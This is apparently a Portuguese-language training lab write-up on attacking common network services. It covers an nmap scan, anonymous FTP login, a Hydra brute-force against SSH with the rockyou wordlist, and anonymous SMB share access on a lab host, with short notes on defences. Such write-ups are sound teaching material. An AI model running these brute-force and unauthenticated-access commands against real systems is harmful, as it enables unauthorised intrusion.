Network Services - Full Report

Objetivo
Aprender a identificar e explorar serviços de rede comuns (SSH, FTP, SMB) e entender seus riscos de segurança.

🛠️ Ferramentas Utilizadas
Ferramenta	Comando Exemplo	Finalidade
Nmap		nmap -sV -p- 10.10.10.10			Varredura de portas e serviços
Hydra		hydra -l user -P pass.txt ftp://10.10.10.10	Brute-force de senhas
Smbclient	smbclient //10.10.10.10/share			Acesso a compartilhamentos SMB

🔍 Passo a Passo Detalhado
1. Identificação de Serviços (Nmap)

Comando:
nmap -sV -p- 10.10.10.10 -oN scan.txt

Saída Crítica:
21/tcp  open  ftp     vsftpd 3.0.3  
22/tcp  open  ssh     OpenSSH 7.6p1  
139/tcp open  netbios-ssn Samba 4.7.6  

O que aprendemos?
A máquina tem FTP (vsftpd), SSH e Samba ativos.

2. Exploração do FTP (Anonymous Login)
Comando:
ftp 10.10.10.10

Login
Usuário: anonymous
Senha: (vazia)

Resultado:
230 Login successful.  
ftp> ls  
-rw-r--r-- 1 ftp ftp 1234 Jan 01 config.txt  

Risco: FTP anônimo permite download de arquivos sensíveis.

3. Ataque de Força Bruta no SSH (Hydra)

Comando:
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10 -t 4

Explicação:
Testa combinações de usuário (admin) e senhas (rockyou.txt).

Saída:
[22][ssh] host: 10.10.10.10   login: admin   password: password123  

Proteção: Desativar logins SSH como root e usar autenticação por chaves.

4. Acesso a Compartilhamento SMB (Smbclient)
Comando:
smbclient //10.10.10.10/public -N

Resultado:
smb: \> ls  
  .                                   D        0  Jan 01 .  
  ..                                  D        0  Jan 01 ..  
  secret.txt                          N      123  Jan 01  

Problema: Compartilhamentos públicos podem vazar dados.

💻 Exercício Prático
Cenário: Verificar se o FTP permite uploads:

ftp 10.10.10.10  
> put arquivo.txt  

Se funcionar, um atacante pode subir malwares!

🏆 Artefatos Coletados
Serviço		Vulnerabilidade			Comando Usado
FTP		Login anônimo			ftp 10.10.10.10
SSH		Senha fraca (password123)	hydra -l admin -P rockyou.txt ssh://...
SMB		Compartilhamento público	smbclient //10.10.10.10/public -N


💡 Lições Aprendidas
Serviços antigos (ex: vsftpd 3.0.3) podem ter vulnerabilidades conhecidas.
Autenticação fraca (senhas padrão/anônimas) é risco crítico.
Ferramentas nativas (nmap, smbclient) são suficientes para testes básicos.